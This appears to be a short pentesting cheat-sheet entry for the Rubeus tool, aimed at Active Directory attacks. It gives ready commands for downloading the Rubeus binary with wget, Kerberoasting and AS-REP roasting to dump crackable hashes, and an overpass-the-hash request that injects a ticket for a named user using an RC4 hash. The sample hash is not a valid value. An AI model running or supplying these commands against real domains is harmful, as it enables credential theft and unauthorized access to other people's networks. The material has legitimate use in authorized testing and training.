---
title: Rubeus
category: ad
subcategory: ad-attacks
os: windows
command: .\Rubeus.exe kerberoast /outfile:hashes.txt
tools: Rubeus
---


### Get Rubeus

```cmd
wget https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe
```

### Kerberoast

```cmd
.\Rubeus.exe kerberoast /outfile:hashes.txt
```

### AS-REP Roast

```cmd
.\Rubeus.exe asreproast /outfile:hashes.txt
.\Rubeus.exe asreproast /nowrap
```

### Request a TGT for a user (Overpass-the-Hash flow)

```cmd
.\Rubeus.exe asktgt /domain:offsec.live /user:hannah /rc4:a29gfinnnjulok33wssa3ffaasf /ptt
klist
```
